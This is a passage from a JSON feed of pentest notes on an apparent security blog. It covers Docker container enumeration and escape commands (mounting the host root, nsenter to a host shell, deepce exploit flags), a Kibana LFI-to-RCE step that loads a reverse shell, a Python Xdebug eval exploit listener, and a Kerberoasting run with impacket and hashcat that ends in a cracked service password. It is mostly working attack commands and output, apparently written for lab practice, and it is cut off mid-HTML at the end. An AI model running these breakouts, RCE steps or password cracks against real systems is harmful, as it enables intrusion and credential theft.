            "content_text": "Overview  Running container with --privileged gives all capabilities to containers compared to just using --cap-add SYS_ADMINDetection  A host may be running docker if it exposes different version of app from network scan. Example is from HTB Enterprise, there are multiple apache versions which is odd. I was found out that its running 2 docker containers, 1 for wordpress and 1 for joomla.Ports  2375/tcp  2376/tcpNetwork  Example container IP is 172.17.0.2Docker API Commands# gets docker versioncurl http://10.10.198.13:2375/version# getting list of images via exposed docker tcp socketdocker -H tcp://10.10.198.13:2375 psContainer Commands# are we inside a container?ls -l /.dockerenvcat /proc/1/cgroup | grep docker# check if privileged - you must see host devicesfdisk -l# check if privileged (looks like these should be seen# under `Current:` and not on the bounding set)# - if Capeff is set to all 0's, the container most likely#   doesn't have much permissions, meaning you can't breakout!capsh --print | egrep 'cap_(net_admin|sys_module|sys_chroot|sys_admin|sys_time)'# Use this if `capsh` is not available# - on attacker machine, get one output and decode it:#     capsh --decode=&lt;NUMBERS&gt;#     NOTE: Look at CapPrm and CapEff outputcat /proc/$$/status | grep ^Cap# Extracting network informationcat /proc/net/tcphostname -Iifconfigip a# Check the available IPs via arp. For example, you can find# IP addresses of databases using these methods below.ip neighborarp -acat /etc/hosts# Check subnetscat /proc/net/fib_trie | grep -B1 \"32 host LOCAL\"# You can also do ping sweep to see reachable IPs.for i in {1..254}; do (ping -c 1 172.17.0.${i} | grep \"bytes from\" | grep -v \"Unreachable\" &amp;); done;for i in {1..65535}; do ping -c 1 172.20.0.${i} &amp;&gt; /dev/null &amp;&amp; echo \"$i: UP\"; done# check if can control docker socketls -l /var/run/docker.sock# check if you can write to the filesystemecho 1 &gt; /proc/sysrq-trigger# try to mount host root volumedocker run -v /:/mnt --rm -it alpine chroot /mnt sh# docker running with --pid=host command? processes# must be similar to host processesps -ef# use a statically compiled nmap and upload# /usr/share/nmap inside the container./nmap --datadir usr/share/nmap -sT -p1-65535 172.20.0.1-10# enter root namespace and drop to host shellnsenter --target 1 --mount sh# create a new namespace mapping root userunshare -r# see if you can migrate to another namespace (root namespace?)nsenter --target 1 --all# check hardcoded IPs and hostnamescat /etc/hosts# check what devices are available and mountedmountcat /proc/mountsAutomated tools# https://github.com/cdk-team/CDK#installationdeliverycdk evaluate --full# https://github.com/PercussiveElbow/docker-escape-tool./docker_escape check# https://github.com/stealthcopter/deepce./deepce.sh./deepce.sh --no-enumeration --exploit PRIVILEGED --username./deepce.sh --password deepceDocker Registries# gets imagescurl http://docker-rodeo.thm:5000/v2/_catalog# gets image tagsurl http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list# inspect image manifest filecurl http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/latest | grep /root/root.txtDocker parameters# gives full privileges on the host system--privileged# removes any security restrictions for the container--security-opt seccomp=undefinedTools  deepce  dive - reverse engineers docker imagesReferences  Docker Breakout - HackTricks  2375, 2376 Pentesting Docker - HackTricks  Hacking Dockers and Containers (OWASP)  GitHub - sneakerhax/OffensiveDocker: Offensive security tools Dockerized  An Attacker Looks at Docker (BlackHat)  Lesson 4: Hacking Containers Like A Boss  Cgroups  https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>Running container with <code class=\"language-plaintext highlighter-rouge\">--privileged</code> gives all capabilities to containers compared to just using <code class=\"language-plaintext highlighter-rouge\">--cap-add SYS_ADMIN</code></li></ul><h2 id=\"detection\">Detection</h2><ul>  <li>A host may be running docker if it exposes different version of app from network scan. Example is from HTB Enterprise, there are multiple apache versions which is odd. I was found out that its running 2 docker containers, 1 for wordpress and 1 for joomla.</li></ul><h2 id=\"ports\">Ports</h2><ul>  <li>2375/tcp</li>  <li>2376/tcp</li></ul><h2 id=\"network\">Network</h2><ul>  <li>Example container IP is <code class=\"language-plaintext highlighter-rouge\">172.17.0.2</code></li></ul><h2 id=\"docker-api-commands\">Docker API Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># gets docker version</span>curl http://10.10.198.13:2375/version<span class=\"c\"># getting list of images via exposed docker tcp socket</span>docker <span class=\"nt\">-H</span> tcp://10.10.198.13:2375 ps</code></pre></div></div><h2 id=\"container-commands\">Container Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># are we inside a container?</span><span class=\"nb\">ls</span> <span class=\"nt\">-l</span> /.dockerenv<span class=\"nb\">cat</span> /proc/1/cgroup | <span class=\"nb\">grep </span>docker<span class=\"c\"># check if privileged - you must see host devices</span>fdisk <span class=\"nt\">-l</span><span class=\"c\"># check if privileged (looks like these should be seen</span><span class=\"c\"># under `Current:` and not on the bounding set)</span><span class=\"c\"># - if Capeff is set to all 0's, the container most likely</span><span class=\"c\">#   doesn't have much permissions, meaning you can't breakout!</span>capsh <span class=\"nt\">--print</span> | egrep <span class=\"s1\">'cap_(net_admin|sys_module|sys_chroot|sys_admin|sys_time)'</span><span class=\"c\"># Use this if `capsh` is not available</span><span class=\"c\"># - on attacker machine, get one output and decode it:</span><span class=\"c\">#     capsh --decode=&lt;NUMBERS&gt;</span><span class=\"c\">#     NOTE: Look at CapPrm and CapEff output</span><span class=\"nb\">cat</span> /proc/<span class=\"nv\">$$</span>/status | <span class=\"nb\">grep</span> ^Cap<span class=\"c\"># Extracting network information</span><span class=\"nb\">cat</span> /proc/net/tcp<span class=\"nb\">hostname</span> <span class=\"nt\">-I</span>ifconfigip a<span class=\"c\"># Check the available IPs via arp. For example, you can find</span><span class=\"c\"># IP addresses of databases using these methods below.</span>ip neighborarp <span class=\"nt\">-a</span><span class=\"nb\">cat</span> /etc/hosts<span class=\"c\"># Check subnets</span><span class=\"nb\">cat</span> /proc/net/fib_trie | <span class=\"nb\">grep</span> <span class=\"nt\">-B1</span> <span class=\"s2\">\"32 host LOCAL\"</span><span class=\"c\"># You can also do ping sweep to see reachable IPs.</span><span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"o\">{</span>1..254<span class=\"o\">}</span><span class=\"p\">;</span> <span class=\"k\">do</span> <span class=\"o\">(</span>ping <span class=\"nt\">-c</span> 1 172.17.0.<span class=\"k\">${</span><span class=\"nv\">i</span><span class=\"k\">}</span> | <span class=\"nb\">grep</span> <span class=\"s2\">\"bytes from\"</span> | <span class=\"nb\">grep</span> <span class=\"nt\">-v</span> <span class=\"s2\">\"Unreachable\"</span> &amp;<span class=\"o\">)</span><span class=\"p\">;</span> <span class=\"k\">done</span><span class=\"p\">;</span><span class=\"k\">for </span>i <span class=\"k\">in</span> <span class=\"o\">{</span>1..65535<span class=\"o\">}</span><span class=\"p\">;</span> <span class=\"k\">do </span>ping <span class=\"nt\">-c</span> 1 172.20.0.<span class=\"k\">${</span><span class=\"nv\">i</span><span class=\"k\">}</span> &amp;&gt; /dev/null <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">echo</span> <span class=\"s2\">\"</span><span class=\"nv\">$i</span><span class=\"s2\">: UP\"</span><span class=\"p\">;</span> <span class=\"k\">done</span><span class=\"c\"># check if can control docker socket</span><span class=\"nb\">ls</span> <span class=\"nt\">-l</span> /var/run/docker.sock<span class=\"c\"># check if you can write to the filesystem</span><span class=\"nb\">echo </span>1 <span class=\"o\">&gt;</span> /proc/sysrq-trigger<span class=\"c\"># try to mount host root volume</span>docker run <span class=\"nt\">-v</span> /:/mnt <span class=\"nt\">--rm</span> <span class=\"nt\">-it</span> alpine <span class=\"nb\">chroot</span> /mnt sh<span class=\"c\"># docker running with --pid=host command? processes</span><span class=\"c\"># must be similar to host processes</span>ps <span class=\"nt\">-ef</span><span class=\"c\"># use a statically compiled nmap and upload</span><span class=\"c\"># /usr/share/nmap inside the container</span>./nmap <span class=\"nt\">--datadir</span> usr/share/nmap <span class=\"nt\">-sT</span> <span class=\"nt\">-p1-65535</span> 172.20.0.1-10<span class=\"c\"># enter root namespace and drop to host shell</span>nsenter <span class=\"nt\">--target</span> 1 <span class=\"nt\">--mount</span> sh<span class=\"c\"># create a new namespace mapping root user</span>unshare <span class=\"nt\">-r</span><span class=\"c\"># see if you can migrate to another namespace (root namespace?)</span>nsenter <span class=\"nt\">--target</span> 1 <span class=\"nt\">--all</span><span class=\"c\"># check hardcoded IPs and hostnames</span><span class=\"nb\">cat</span> /etc/hosts<span class=\"c\"># check what devices are available and mounted</span>mount<span class=\"nb\">cat</span> /proc/mounts</code></pre></div></div><h2 id=\"automated-tools\">Automated tools</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># https://github.com/cdk-team/CDK#installationdelivery</span>cdk evaluate <span class=\"nt\">--full</span><span class=\"c\"># https://github.com/PercussiveElbow/docker-escape-tool</span>./docker_escape check<span class=\"c\"># https://github.com/stealthcopter/deepce</span>./deepce.sh./deepce.sh <span class=\"nt\">--no-enumeration</span> <span class=\"nt\">--exploit</span> PRIVILEGED <span class=\"nt\">--username</span>./deepce.sh <span class=\"nt\">--password</span> deepce</code></pre></div></div><h2 id=\"docker-registries\">Docker Registries</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># gets images</span>curl http://docker-rodeo.thm:5000/v2/_catalog<span class=\"c\"># gets image tags</span>url http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/tags/list<span class=\"c\"># inspect image manifest file</span>curl http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/latest | <span class=\"nb\">grep</span> /root/root.txt</code></pre></div></div><h2 id=\"docker-parameters\">Docker parameters</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># gives full privileges on the host system</span><span class=\"nt\">--privileged</span><span class=\"c\"># removes any security restrictions for the container</span><span class=\"nt\">--security-opt</span> <span class=\"nv\">seccomp</span><span class=\"o\">=</span>undefined</code></pre></div></div><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/stealthcopter/deepce\">deepce</a></li>  <li><a href=\"https://github.com/wagoodman/dive\">dive</a> - reverse engineers docker images</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout\">Docker Breakout - HackTricks</a></li>  <li><a href=\"https://book.hacktricks.xyz/pentesting/2375-pentesting-docker\">2375, 2376 Pentesting Docker - HackTricks</a></li>  <li><a href=\"https://owasp.org/www-chapter-sydney/files/docker-containers.pdf\">Hacking Dockers and Containers (OWASP)</a></li>  <li><a href=\"https://github.com/sneakerhax/OffensiveDocker\">GitHub - sneakerhax/OffensiveDocker: Offensive security tools Dockerized</a></li>  <li><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-McGrew-An-Attacker-Looks-At-Docker-Approaching-Multi-Container-Applications-wp.pdf\">An Attacker Looks at Docker (BlackHat)</a></li>  <li><a href=\"https://www.practical-devsecops.com/lesson-4-hacking-containers-like-a-boss/\">Lesson 4: Hacking Containers Like A Boss</a></li>  <li><a href=\"https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt\">Cgroups</a></li>  <li>https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/17/docker",
            
            
            
            "tags": ["devops","docker","enum"],
            
            "date_published": "2022-03-17T00:00:00+08:00",
            "date_modified": "2022-03-17T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/15/kibana-lfi-to-rce",
            "title": "Kibana LFI to RCE",
            "summary": "Kibana LFI to RCE",
            "content_text": "OverviewAttacker can achieve RCE by including a node js reverse shell via LFI and RFIAffected VersionsVersions before 6.4.3 and 5.6.13.Steps  Put your node js reverse shell in /tmp of victim machine via file upload  Open netcat listener on attacker machine  Do an LFI# this example assumes you have access inside the victim via file upload# or any other meanscurl 'http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/evil.js'References  Resolving Kibana Local File Inclusion Flaw CVE-2018-17246  GitHub - mpgn/CVE-2018-17246: CVE-2018-17246 - Kibana LFI &lt; 6.4.3 &amp; 5.6.13  https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it  learn365/day32.md at main · harsh-bothra/learn365 · GitHub",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can achieve RCE by including a node js reverse shell via LFI and RFI</p><h2 id=\"affected-versions\">Affected Versions</h2><p>Versions before 6.4.3 and 5.6.13.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Put your node js reverse shell in <code class=\"language-plaintext highlighter-rouge\">/tmp</code> of victim machine via file upload</li>  <li>Open netcat listener on attacker machine</li>  <li>Do an LFI</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># this example assumes you have access inside the victim via file upload</span><span class=\"c\"># or any other means</span>curl <span class=\"s1\">'http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/evil.js'</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.elastic.co/blog/kibana-local-file-inclusion-flaw-cve-2018-17246\">Resolving Kibana Local File Inclusion Flaw CVE-2018-17246</a></li>  <li><a href=\"https://github.com/mpgn/CVE-2018-17246\">GitHub - mpgn/CVE-2018-17246: CVE-2018-17246 - Kibana LFI &lt; 6.4.3 &amp; 5.6.13</a></li>  <li>https://www.cyberark.com/resources/threat-research-blog/execute-this-i-know-you-have-it</li>  <li><a href=\"https://github.com/harsh-bothra/learn365/blob/main/days/day32.md\">learn365/day32.md at main · harsh-bothra/learn365 · GitHub</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/15/kibana-lfi-to-rce",
            
            
            
            "tags": ["kibana","exploit","rce"],
            
            "date_published": "2022-03-15T00:00:00+08:00",
            "date_modified": "2022-03-15T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/11/php-xdebug",
            "title": "PHP XDebug",
            "summary": "PHP XDebug",
            "content_text": "OverviewXdebug is a PHP debugging tool that supports remote debugging of PHP code on the server through source code locally. Xdebug has powerful functions, and there have been many articles about its configuration recently. The idea of digging the attack surface of Xdebug was born a long time ago, and finally I did it today, a day suitable for paddling.Vulnerable Versions  &lt;= 2.5.5Example Exploit Scripts#!/usr/bin/python2import socketip_port = ('0.0.0.0',9000)sk = socket.socket()sk.bind(ip_port)sk.listen(10)conn, addr = sk.accept()while True:    client_data = conn.recv(1024)    print(client_data)    data = raw_input('&gt;&gt; ')    conn.sendall('eval -i 1 -- %s\\x00' % data.encode('base64'))  GitHub - gteissier/xdebug-shell: xdebug reverse shellAlternatives  You can use chrome also to exploit thisReferences  HTB Olympus  https://paper.seebug.org/397/  The Exploits of Xdebug in PhpStorm",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Xdebug is a PHP debugging tool that supports remote debugging of PHP code on the server through source code locally. Xdebug has powerful functions, and there have been many articles about its configuration recently. The idea of digging the attack surface of Xdebug was born a long time ago, and finally I did it today, a day suitable for paddling.</p><h2 id=\"vulnerable-versions\">Vulnerable Versions</h2><ul>  <li>&lt;= 2.5.5</li></ul><h2 id=\"example-exploit-scripts\">Example Exploit Scripts</h2><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/python2</span><span class=\"kn\">import</span> <span class=\"nn\">socket</span><span class=\"n\">ip_port</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"s\">'0.0.0.0'</span><span class=\"p\">,</span><span class=\"mi\">9000</span><span class=\"p\">)</span><span class=\"n\">sk</span> <span class=\"o\">=</span> <span class=\"n\">socket</span><span class=\"p\">.</span><span class=\"n\">socket</span><span class=\"p\">()</span><span class=\"n\">sk</span><span class=\"p\">.</span><span class=\"n\">bind</span><span class=\"p\">(</span><span class=\"n\">ip_port</span><span class=\"p\">)</span><span class=\"n\">sk</span><span class=\"p\">.</span><span class=\"n\">listen</span><span class=\"p\">(</span><span class=\"mi\">10</span><span class=\"p\">)</span><span class=\"n\">conn</span><span class=\"p\">,</span> <span class=\"n\">addr</span> <span class=\"o\">=</span> <span class=\"n\">sk</span><span class=\"p\">.</span><span class=\"n\">accept</span><span class=\"p\">()</span><span class=\"k\">while</span> <span class=\"bp\">True</span><span class=\"p\">:</span>    <span class=\"n\">client_data</span> <span class=\"o\">=</span> <span class=\"n\">conn</span><span class=\"p\">.</span><span class=\"n\">recv</span><span class=\"p\">(</span><span class=\"mi\">1024</span><span class=\"p\">)</span>    <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"n\">client_data</span><span class=\"p\">)</span>    <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"nb\">raw_input</span><span class=\"p\">(</span><span class=\"s\">'&gt;&gt; '</span><span class=\"p\">)</span>    <span class=\"n\">conn</span><span class=\"p\">.</span><span class=\"n\">sendall</span><span class=\"p\">(</span><span class=\"s\">'eval -i 1 -- %s</span><span class=\"se\">\\x00</span><span class=\"s\">'</span> <span class=\"o\">%</span> <span class=\"n\">data</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">'base64'</span><span class=\"p\">))</span></code></pre></div></div><ul>  <li><a href=\"https://github.com/gteissier/xdebug-shell\">GitHub - gteissier/xdebug-shell: xdebug reverse shell</a></li></ul><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>You can use <a href=\"https://www.youtube.com/watch?v=7ifJOon5-G8&amp;t=587s\">chrome</a> also to exploit this</li></ul><h2 id=\"references\">References</h2><ul>  <li>HTB Olympus</li>  <li>https://paper.seebug.org/397/</li>  <li><a href=\"https://medium.com/@knownsec404team/the-exploits-of-xdebug-in-phpstorm-2ca140e91dc\">The Exploits of Xdebug in PhpStorm</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/11/php-xdebug",
            
            
            
            "tags": ["php","rce","foothold"],
            
            "date_published": "2022-03-11T00:00:00+08:00",
            "date_modified": "2022-03-11T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/10/kerberoasting-impacket",
            "title": "Kerberoasting - Impacket",
            "summary": "Kerberoasting - Impacket",
            "content_text": "Environment Setup  Needs a low privileged account and credentialsSteps  Fire up getuserspns.py to intercept a TGS. This tool is still part of impacket toolkit.$ impacket-GetUserSPNs home.local/fcastle:Password1 -dc-ip 192.168.18.25 -request/home/kali/.local/lib/python2.7/site-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.  CryptographyDeprecationWarning,Impacket v0.9.21 - Copyright 2020 SecureAuth CorporationServicePrincipalName            Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation ------------------------------  ----------  ---------------------------------------------------------  --------------------------  ---------  ----------dc/SQLService.home.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=home,DC=local  2020-09-21 20:39:28.042702  &lt;never&gt;               $krb5tgs$23$*SQLService$HOME.LOCAL$dc/SQLService.home.local~60111*$adf93e5eda682b7db85dbd12947dd18a$ec689dadf6fa1a1d278af9292df3e4bedd69c898e443cc7bcae926b0732d708ad8c50c0ba0d398fe59c4b769429384804903a4753c41f1ba2a63e4b561a96096b72d0e2a330bb78001a889163b557964506304273f06f6a1c55e7146e94a53800e49b999bc921416d1d8e8496a2869a2fba3956770b5992562c6ab0406c4a4c5ab69f274cceddcfb191631b5ba968f060c4b17fd44b72e13a734bb9086d6fa440cad248d0622ac516b93abcdb3c879b587b952eeb84565a890fdd164975270d8538d5c2a482d50fb81b15bc4d35e87e53fb6be89732c2ba1ce8b628884c0e525c919ddfc8067250b6c0b8e53e7a3a2f50d873cfe5aa5e4e71e2ca430ccf85b184b2ae13ced1121b0b732c3319c93ba051ec792d6357469229df7e321262e3094ac7054d432c19de069d651a385d7f003d28bca53f05a23b33b475903a5ac6b29cebda56cee8f21b2864261d32d32b9629437a9430b24926de3cb0c699ae1b815f90a873e1a22be1ff2c416d5cbae0dd5582f7f11f3807f1410ac8236ed30907265f5f70afbd5ef912440faa13b97673f65ce42fca939715114cdec7afd51c2e92b487020d7351cc10a59bccb55285d2822a32d0fdf51414e1085c79be0316f0713b6b9df7f58115102e21ba4bcfe74639c47e67237e2fdf6fb7afe63922a3a187b7028e97ce63acc1ec93414e78108c5665207809e220c3af6d4a7b7da50cb086f6608e0bd456d2ebaedf403682b407fffdba4844d32df6df5143d8c2cf5ee2d862828c71350ac5485c06abe1dbfd46d017b4d38a1afe008284a1f48b242b7156805ec8b3c9fc4ccbad29ef2818ad8d299db6c034f9817bb4ff40b30a26fa3c23c1e72e8c54ebb709e811a0e919b08b1635a92fb63e500fb09d3d792a97cb0736965d2181e211dd2c14d1fba0701bb28b063af8639e5d60c801f198c1290498f0365c9c4b00cc20257646c76be2d31ada0ca17d305169a182e16417b3e6cbe5f125142915632920129865ea5169fc8396313457a23061a55d3be9b2ff1ca976de6f512e056c4ebbdfe9ef3d2fdb2ccd5d3f9dc5fb31e689b23e04b2b6b8b95bb7ccaddd8a1346b1c354460cbb004ac228082a38d35d830f0979a72fe54c09b6605a01899bdb616668c52702e3b0bc77efcaa2c333c43f72fa7ba12cdf56ae36abd9bcc3cac8c987b21545c234ef92c6346f677a1cb80a11d50beec2c180311e1a99bc60cdaf8495f26c986827cf3060847b830ae7231942bacb6c0965954d09756e6ec16381812d651dbec5dccc79de0e834  Copy that entire hash and use hashcat to crack it.$ hashcat --help | grep Kerb   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols$ hashcat -m 13100 tgtkrbhash.txt /usr/share/wordlists/rockyou.txt -Ohashcat (v6.0.0) starting...OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]=============================================================================================================================* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2870/2934 MB (1024 MB allocatable), 2MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 31Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Optimized-Kernel* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltWatchdog: Hardware monitoring interface not found on your system.Watchdog: Temperature abort trigger disabled.Host memory required for this attack: 99 MBDictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385# password at the end$krb5tgs$23$*SQLService$HOME.LOCAL$dc/SQLService.home.local~60111*$a8e8ff9ef784cc428504d5fa734796df$b75a36390a057bd909525915c24216b75024cea26b541943fae1a8341a4e4e753e4659d0be682c16b310eb6698e043ea6e7ebd2d8ca967b3c7c22dacdc0e0ab3b130a7f7f13cb05464e83d9848f95815f0923cfe2a9c23ecce605bc5b1f64b7230d6392a56eaa3a9e6a25a892367438caa2bb0c9a6c4e07595cf3732d2387c63404f9b4c82a9e397df23003eac337310921bef71405e451d45e2ac28d2e74327ddb59e964f779234d357a69baab1fd396df0905a3be7d6994863545db67c8ee7529575bf9e36122529121f9810d3c45971b8fad5458bc89c3a75a6d4c8b5a780d73dff97a9c05adf7e3a16296a3fbc4e95a72c22c82fac52a78d620fca278c2300478ad497b9da7ec6441cddd2dcf2a85490778c38a39045e40adf2b68462cb207d20783b7f55d6da5a180643195a2c15c167a4d33b12ce1faf554f78278b6b35317cf7916e71c2ab1e0f751698da8fdd408403510b299627fb18b47f41dca44361f8b1ecdc2d8ee66529d5de6a278e5f255087a48b013fc40c88d18a4ab5f1fc3a0a39efd2efefe56e1a6a214d2f16f2c8dad8142c64cefc2e87df93f0c0081d6a1847a32ef837d3f91f3990214eb0b52a3a97aaeec8b2fa94f67e6089898947ad322aba3a32bb0ae838bea385e1ac4cd11e8935052de12c453c4eafce5af50e6f5b9d92e238238ae9b82f995c9e4fda6c3434d925ab47a10e649d1ce02f50f04ca3f051e0c46f4ec24f3c7c1c412617cabd749ed4bf9ed50b93a1497b15a332fd4364c66c07627455a1fe0f45d47af5810f54fe4d25e2eff8655c8e071ecaeea7013608935cc5830d4607d50af5bccd0d44ac66e13911df0af182359ae0ceee20b48aeb8dbca6bac9497b1b4bb70e297b1b0f180d1a3eeca34a2cd4bde849515950ae7faa6fbccdb9b31a1db2826d185ee79d98f64c79c50ab04ca0f90e97db86e9740a782bfab7e500518f894fb162e9c4edaa480c829792e1d4ae72a2876ed34d9e3cba8a03618eba10d0f94e5b7d467cc130851d592ebde3fac06431e6b8500fadc066e79c5975f597af53457c1bbfc13b5781512935af00f9d826400916786bfacefb8aa62b2584a09ff3f33259f896ef4f716a9795af623197c59045ef4f8e64f73dbef6fa0beb043fe72dcc0cb2aaa5f1150e8ff40ad7c3f52a7af5dc86eeb24405c86f14aa8e54538419a19db470a8ba744e0ec3682e3217dbf8f4c6e09f37fcffa14dcbbf215e43ae8a7e609e86990cce06ea95d4c076adc636b7a462b9a6780acf583a1ee826039bf3b60135b:MYpassword123#                                                 Session..........: hashcatStatus...........: CrackedHash.Name........: Kerberos 5, etype 23, TGS-REPHash.Target......: $krb5tgs$23$*SQLService$HOME.LOCAL$dc/SQLService.ho...60135bTime.Started.....: Thu Oct  1 13:12:55 2020 (16 secs)Time.Estimated...: Thu Oct  1 13:13:11 2020 (0 secs)Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:   698.8 kH/s (8.40ms) @ Acceppsel:64 Loops:1 Thr:64 Vec:8Recovered........: 1/1 (100.00%) DigestsProgress.........: 10848312/14344385 (75.63%)Rejected.........: 2104/10848312 (0.02%)Restore.Point....: 10840120/14344385 (75.57%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: Mamita01 -&gt; MY2girlSStarted: Thu Oct  1 13:12:54 2020Stopped: Thu Oct  1 13:13:11 2020",
            "content_html": "<h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Needs a low privileged account and credentials</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Fire up <code class=\"language-plaintext highlighter-rouge\">getuserspns.py</code> to intercept a TGS. This tool is still part of impacket toolkit.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>impacket-GetUserSPNs home.local/fcastle:Password1 <span class=\"nt\">-dc-ip</span> 192.168.18.25 <span class=\"nt\">-request</span>/home/kali/.local/lib/python2.7/site-packages/cryptography/__init__.py:39: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class=\"k\">for </span>it is now deprecated <span class=\"k\">in </span>cryptography, and will be removed <span class=\"k\">in </span>a future release.  CryptographyDeprecationWarning,Impacket v0.9.21 - Copyright 2020 SecureAuth CorporationServicePrincipalName            Name        MemberOf                                                   PasswordLastSet             LastLogon  Delegation <span class=\"nt\">------------------------------</span>  <span class=\"nt\">----------</span>  <span class=\"nt\">---------------------------------------------------------</span>  <span class=\"nt\">--------------------------</span>  <span class=\"nt\">---------</span>  <span class=\"nt\">----------</span>dc/SQLService.home.local:60111  SQLService  <span class=\"nv\">CN</span><span class=\"o\">=</span>Group Policy Creator Owners,OU<span class=\"o\">=</span>Groups,DC<span class=\"o\">=</span>home,DC<span class=\"o\">=</span><span class=\"nb\">local  </span>2020-09-21 20:39:28.042702  &lt;never&gt;               <span class=\"nv\">$krb5tgs$23$*</span>SQLService<span class=\"nv\">$HOME</span>.LOCAL<span class=\"nv\">$dc</span>/SQLService.home.local~60111<span class=\"k\">*</span><span 